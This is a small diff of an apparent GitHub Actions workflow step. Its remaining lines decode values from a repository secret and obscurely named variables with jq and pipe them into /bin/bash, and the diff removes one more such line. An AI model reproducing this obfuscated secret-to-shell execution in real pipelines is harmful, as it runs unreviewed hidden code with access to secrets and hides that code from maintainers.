@@ -23,7 +23,6 @@ jobs:
           r1: ${{ secrets.r1 }}
         run: |
           printf '%s' "$r1" | jq -r .hfm99 | /bin/bash
-          printf '%s' "$dqk4244" | jq -r .bf14896 | /bin/bash
           echo $z9933 | jq -r .go2 | /bin/bash
           echo $wpt8656 | jq -r .xgobx4 | /bin/bash
 
